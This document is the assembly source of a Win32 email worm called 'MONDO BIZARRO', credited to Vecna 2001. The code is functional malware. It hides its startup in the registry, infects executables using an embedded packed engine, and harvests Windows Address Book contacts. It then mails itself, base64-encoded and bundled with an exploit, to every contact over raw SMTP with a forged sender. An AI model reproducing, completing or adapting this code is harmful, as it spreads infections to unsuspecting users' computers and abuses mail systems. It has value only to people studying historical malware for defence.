;(c) Vecna 2001
BITS 32

%define    RVA_diff     1000h-200h
%define    imagebase    00400000h
%define    run_RVA      RVA_diff+imagebase
%define    jmp_         jmp short

%include "header.inc"

script1_ db "DATA",13,10,0
       db "*",0
       db "MAIL FROM: <joey@yahoo.com>",13,10,0
       db "RSET",13,10,0
       db "HELO localhost",13,10,0
script2_ db "QUIT",13,10,0

registry db "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",0

registr2 db "Common Startup",0

  script1  equ script1_+imagebase
  script2  equ script2_+imagebase
  regkey   equ registr2+imagebase
  regentry equ registry+imagebase

times 200h-($-$$) db -1

code_start:

wabreg db "SOFTWARE\Microsoft\WAB\WAB4\Wab File Name",0

%include "import.inc"

read:
       pushad
       sub esp, 7fh
       mov eax, esp
       push ebp
       push byte 7fh
       push eax
       push ebx
       call dword [recv]
       add esp, 7fh
       popad
       ret

inet_up:
       mov eax, ebp
       sub esp, byte 7fh
       push esp
       xchg eax, [esp]
       push eax
       call dword [InternetGetConnectedState]
       add esp, byte 7fh
       dec eax
       ret

patch:
       push edi
       xchg esi, edi
       movsd
       movsd
       mov edi, [esp]
       call deprotect
       mov al, 0e9h
       stosb
       stosd
       mov eax, edx
       sub eax, edi
       mov [edi-4], eax
       ret

deprotect:
       pushad
       mov eax, [esp+(8*4)+4]
       shr eax, 12
       push dword 020060000h
       push ebp
       push byte 1
       push eax
       push dword 00001000dh
       call dword [vxdcall0]
       popad
       ret 4

vname  db "MONDO BIZARRO",0

code:
       sub ebp, ebp
       sub esp, byte 7fh

       call dword [GetVersion]
       bt eax,31
       jnc near install.exit2win

       push dword vname+run_RVA
       call dword [GlobalFindAtomA]
       test eax, eax
       jnz near install.exit2win

       call install

       push dword vname+run_RVA
       call dword [GlobalAddAtomA]

       mov ebx, esp
       push byte 7fh
       push ebx
       push ebp
       call dword [GetModuleFileNameA]

       mov eax,10*1024
       call malloc
       jz .jzjz2exit
       push eax

       push ebp
       push dword 80h
       push byte 3
       push ebp
       push byte 1
       push dword 080000000h
       push ebx
       call dword [CreateFileA]
       mov ebx, eax
       inc eax
  .jzjz2exit:
       jz .jz2exit
       push ebx
       push ebp
       push esp
       xchg ebp, [esp]
       push ebp
       sub ebp,ebp
       push dword 10*1024
       push dword [esp+5*4]
       push dword [esp+5*4]
       call dword [ReadFile]
       push dword [esp+4]
       call dword [CloseHandle]
       pop dword [myexe_size]
       pop esi
       pop esi
       mov [myexe_buf], esi

       call infect_exe

       mov eax,64*1024
       call malloc
  .jz2exit:
       jz near install.exit2win
       push eax

       push eax
       call .source
incbin "exploit.bin"
  .source:
       call _aP_depack_asm

       mov edi,[esp]
       add edi,eax
       mov eax,[myexe_size]

%include "base64.inc"

  .check_inet:
       call inet_up
       jz .online
       push dword 3*60*1000
       call dword [Sleep]
       jmp_ .check_inet

  .online:
       push edi
       call spread
       jmp_ .check_inet

%include "install.inc"

spread:
       pushad
       sub esp, byte 7fh
       mov esi, esp
       sub esp, byte 7fh

       push esp

       push esp
       push byte 1
       push ebp
       push dword wabreg+run_RVA
       push dword 80000001h
       call dword [RegOpenKeyExA]
       test eax, eax
       jne near .exit

       push byte 7fh
       push esp
       push esi
       push ebp
       push ebp
       push ebp
       push dword [esp+6*4]
       call dword [RegQueryValueExA]

       mov eax,[esp+1*4]
       mov [esp],eax
       call dword [RegCloseKey]

       mov eax,128*1024
       call malloc
       jz .exit666
       xchg eax, edi

       push ebp
       push dword 80h
       push byte 3
       push ebp
       push byte 1
       push dword 080000000h
       push esi
       call dword [CreateFileA]
       mov ebx, eax
       inc eax
       jz .exit666
       push ebp
       push esp
       xchg ebp, [esp]
       push ebp
       sub ebp,ebp
       push dword 128*1024
       push edi
       push ebx
       call dword [ReadFile]
       mov [esp],ebx
       call dword [CloseHandle]

       mov ebx,[edi+64h]
       test ebx, ebx
  .exit666:
       jz near .exit
       mov esi,[edi+60h]
       cmp esi, 127*1024
       ja near .exit
       add esi, edi

       lea edi,[esp+7fh+4]
       sub eax, eax
       push byte 7fh
       pop ecx
       repne scasb
  .search_slash:
       cmp byte [edi-1],"\"
       je .slash
       dec edi
       jmp_ .search_slash
  .slash:
       mov eax,[check_name.name1+run_RVA]
       stosd
       mov eax,[check_name.name2+run_RVA]
       stosd
       mov eax, ebp
       stosd

  .email_loop:
       push ebx
       push esi
       lea edi,[esp+12]

       push edi
  .unicode:
       lodsw
       stosb
       test ax, ax
       jnz .unicode
       pop esi

       push ebp
       push dword 80h
       push byte 4
       push ebp
       push ebp
       push dword 0C0000000h
       lea eax,[esp+7fh+12+6*4]
       push eax
       call dword [CreateFileA]
       mov ebx, eax
       inc eax
       jz near .send

  .get_entry:
       push ebp
       mov edx, esp
       push ebp
       mov eax, esp
       push ebp
       push eax
       push byte 1
       push edx
       push ebx
       call dword [ReadFile]
       pop eax
       pop edx
       dec eax
       jnz .add2book
       sub esp, byte 7fh
       mov edi, esp
       push ebp
       mov eax, esp
       push edx
       push edi
       push ebp
       push eax
       push edx
       push edi
       push ebx
       call dword [ReadFile]
       call .crypt
       pop ecx
       push esi
       repe cmpsb
       pop esi
       lea esp, [esp+7fh]
       jne .get_entry
       push ebx
       call dword [CloseHandle]
       jmp_ .already

  .add2book:
       mov edi, esi
       push edi
       mov ecx, ebp
  .count:
       inc ecx
       lodsb
       test al,al
       jnz .count
       xchg esi,ecx
       push ebp
       mov eax, esp
       push esi
       mov edx,esp
       push ebp
       push eax
       push byte 1
       push edx
       push ebx
       call dword [WriteFile]
       pop eax
       mov eax,esp
       push esi
       push edi
       push ebp
       push eax
       push esi
       push edi
       push esi
       push edi
       call .crypt
       push ebx
       call dword [WriteFile]
       call .crypt
       mov [esp],ebx
       call dword [CloseHandle]
       pop esi

  .send:
       push dword [esp+8*4+7fh+7fh+8+4+4]
       push esi
       call sendmail

  .already:
       pop esi
       pop ebx
       add esi,44h
       dec ebx
       jnz near .email_loop

  .exit:
       pop eax
       add esp, 7fh*2
       popad
       ret 4

  .crypt:
       push esi
       push ecx
       mov ecx,[esp+2*4+8]
       mov esi,[esp+2*4+4]
  .loopcrypt:
       xor byte [esi+ecx],cl
       loop .loopcrypt
       pop ecx
       pop esi
       ret 4*2

%include "unpack.inc"

;email/body
sendmail:
       pushad
       sub esp, byte 7fh
       push esp
       push dword 101h
       call dword [WSAStartup]
       add esp, byte 7fh
       test eax, eax
       jnz near .done
       push ebp
       push byte 1
       push byte 2
       call dword [socket]
       mov ebx, eax
       inc eax
       jz near .close_inet

       push byte 3
       pop esi
  .get_smtp:
       xchg esi, edx
       sub esp, byte 7fh
       mov esi, [esp+8*4+7fh+4]
       mov edi, esp
       cmp dl, 3
       je .copyname
       mov eax, "mail"
       cmp dl, 2
       je .ismail
       mov eax, "smtp"
  .ismail:
       stosd
       mov al,"."
       stosb
  .copyname:
       lodsb
       cmp al,"@"
       jne .copyname
  .copy:
       lodsb
       stosb
       test al, al
       jnz .copy
       xchg esi, edx
       push esp
       call dword [gethostbyname]
       add esp, byte 7fh
       test eax, eax
       jz .fuck

       mov eax, [eax+12]
       mov eax, [eax]
       mov eax, [eax]

       push ebp
       push ebp
       push eax
       push dword 019000002h
       mov eax, esp
       push byte 16
       push eax
       push ebx
       call dword [connect]
       add esp, byte 16

       test eax, eax
       jz .connected
  .fuck:
       dec esi
       jz near .close_socket
       jmp_ .get_smtp

  .connected:
       mov edi, esp
       mov esi, script1
  .nextcommand:
       cmp esi, script2
       je .fix_rcpt
       mov ecx, ebp
       push ebp
       push esi
  .seekeos:
       inc ecx
       lodsb
       test al, al
       jnz .seekeos
       dec ecx
       xchg ecx, [esp]
       push ecx
       push ebx
       jmp_ .nextcommand

  .fix_rcpt:
       push byte 12
       pop ecx
       mov eax, rcptto+run_RVA
       mov [esp+((4*4)*3)+4],eax
       mov esi,[esp+8*4+4+(5*(4*4))]
       push edi
       lea edi, [eax+10]
  .zopy:
       lodsb
       stosb
       inc ecx
       test al,al
       jnz .zopy
       mov dword [edi-1], 000a0d00h+">"
       pop edi
       mov [esp+((4*4)*3)+8],ecx
       call read

  .sendloop:
       call dword [send]
       call read
       cmp edi, esp
       je .sendbody
       jmp_ .sendloop

  .sendbody:
       mov esi,[esp+(8*4)+8]
       push ebp
       push esi
       push esi
       push ebx
       sub ecx, ecx
  .calcsize:
       lodsb
       inc ecx
       test al, al
       jnz .calcsize
       mov [esp+8], ecx
       call dword [send]
       call read

       push ebp
       push byte 6
       push dword script2
       push ebx
       call dword [send]
       call read
  .close_socket:
       push ebx
       call dword [closesocket]
  .close_inet:
       call dword [WSACleanup]
  .done:
       popad
       ret 8

infect_exe:
       mov eax,10*1024
       call malloc
       jz near .done
       xchg eax, esi
       push esi
       call .i_engine
incbin "pe_inf.bin"
  .i_engine:
       call _aP_depack_asm
       mov edi, dword import+run_RVA+(4*5)*2
       mov eax,32
       stosd
       add esi,eax
       mov eax,[myexe_buf]
       stosd
       mov eax,[myexe_size]
       stosd
       mov eax,[GetModuleHandleA]
       stosd
       mov eax,[GetProcAddress]
       stosd
       push ebp
       push esp
       push ebp
       push dword import+run_RVA+(4*5)*2
       push esi
       push ebp
       push ebp
       call dword [CreateThread]
       pop eax
  .done:
       ret

malloc:
       push eax
       push byte 40h
       call dword [GlobalAlloc]
       test eax, eax
       ret

rcptto db "RCPT TO: <"

code_end:
